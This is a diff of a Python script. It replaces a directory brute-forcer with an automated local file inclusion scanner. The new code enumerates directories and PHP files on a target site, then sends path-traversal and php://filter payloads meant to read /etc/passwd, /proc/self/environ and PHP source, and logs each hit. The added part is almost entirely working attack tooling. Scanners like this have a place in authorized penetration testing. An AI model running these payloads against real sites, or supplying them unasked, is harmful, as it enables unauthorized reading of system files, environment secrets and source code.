@@ -3,91 +3,84 @@ import threading
 import queue
 import argparse
 
-# Queue for managing words
-q = queue.Queue()
-lock = threading.Lock()
-found_results = []  # Store found directories/files
+# Argument Parser
+parser = argparse.ArgumentParser(description="Auto LFI Scanner")
+parser.add_argument("url", help="Target URL (e.g., http://example.com)")
+args = parser.parse_args()
 
+# Configuration
+TARGET_URL = args.url.rstrip('/')  # Ensure no trailing slash
+DIR_WORDLIST = "dir.txt"
+QUERY_WORDLIST = "query.txt"
+LFI_PAYLOADS = [
+    "../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "../../../../../../etc/hosts",
+    "../../../../../../proc/self/environ",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+]
 
-# Function to check directories/files
-def check_url(target_url, extensions, proxies, user_agent, status_codes):
-    headers = {"User-Agent": user_agent} if user_agent else {}
+# Load wordlists
+def load_wordlist(filename):
+    with open(filename, "r") as f:
+        return [line.strip() for line in f if line.strip()]
 
-    while not q.empty():
-        word = q.get()
-        urls = [f"{target_url.rstrip('/')}/{word}"]
+directories = load_wordlist(DIR_WORDLIST)
+query_params = load_wordlist(QUERY_WORDLIST)
 
-        # Append extensions if provided
-        if extensions:
-            urls.extend([f"{target_url.rstrip('/')}/{word}{ext}" for ext in extensions])
+# Queue for threading
+task_queue = queue.Queue()
 
-        for url in urls:
+# Function to check if a directory or PHP file exists
+def check_path(path):
+    url = f"{TARGET_URL}/{path}"
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            print(f"[+] Found: {url}")
+            if path.endswith(".php"):
+                test_lfi(path)  # Call LFI testing immediately if it's a PHP file
+            return True
+    except requests.RequestException as e:
+        print(f"[-] Request failed for {url}: {e}")
+    return False
+
+# Function to test for LFI
+def test_lfi(target_path):
+    for param in query_params:
+        for payload in LFI_PAYLOADS:
+            test_url = f"{TARGET_URL}/{target_path}?{param}={payload}"
+            print(f"[*] Testing: {test_url}")  # Print every tested URL
             try:
-                response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
+                response = requests.get(test_url, timeout=5)
+                if "root:x:" in response.text or "<?php" in response.text:
+                    print(f"[!!!] LFI Found: {test_url}")
+                    with open("lfi_results.txt", "a") as log_file:
+                        log_file.write(f"LFI Found: {test_url}\n")
+            except requests.RequestException as e:
+                print(f"[-] Failed to test LFI for {test_url}: {e}")
 
-                if response.status_code in status_codes:
-                    result = f"[+] Found: {url} ({response.status_code})"
+# Worker function for threading
+def worker():
+    while not task_queue.empty():
+        task = task_queue.get()
+        check_path(task)  # Directly check paths and test LFI if PHP file is found
+        task_queue.task_done()
 
-                    # Print result thread-safe
-                    with lock:
-                        print(result)
-                        found_results.append(result)  # Store result for final output
-            except requests.exceptions.RequestException:
-                pass  # Ignore errors
+# Populate the task queue
+for dir_name in directories:
+    task_queue.put(dir_name)
+    task_queue.put(f"{dir_name}.php")
 
-        q.task_done()
+# Start worker threads
+threads = []
+for _ in range(10):  # Adjust the number of threads as needed
+    t = threading.Thread(target=worker)
+    t.start()
+    threads.append(t)
 
+# Wait for all threads to finish
+task_queue.join()
 
-# Load wordlist into queue
-def load_wordlist(wordlist_file):
-    with open(wordlist_file, "r") as file:
-        for line in file:
-            q.put(line.strip())
-
-
-# Main function
-def main():
-    parser = argparse.ArgumentParser(description="Python GoBuster Clone")
-    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com)")
-    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
-    parser.add_argument("-x", "--extensions", help="File extensions to check (comma-separated, e.g., .php,.html,.txt)")
-    parser.add_argument("--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
-    parser.add_argument("--user-agent", help="Custom User-Agent string")
-    parser.add_argument("--status-codes",
-                        help="Filter results by status codes (comma-separated, default: 200,301,302,403)")
-    parser.add_argument("-o", "--output", help="Save results to an output file")
-
-    args = parser.parse_args()
-
-    # Convert extensions to list
-    extensions = args.extensions.split(",") if args.extensions else []
-
-    # Convert status codes to list
-    status_codes = list(map(int, args.status_codes.split(","))) if args.status_codes else [200, 301, 302, 403]
-
-    # Set up proxies
-    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
-
-    # Load wordlist
-    load_wordlist(args.wordlist)
-
-    # Start threads
-    threads = []
-    for _ in range(args.threads):
-        t = threading.Thread(target=check_url, args=(args.url, extensions, proxies, args.user_agent, status_codes))
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    # Write all results to the output file at the end
-    if args.output and found_results:
-        with open(args.output, "w") as f:
-            f.write("\n".join(found_results))
-        print(f"\n[+] Results saved to: {args.output}")
-
-
-if __name__ == "__main__":
-    main()
+print("[+] LFI Scan Complete!")
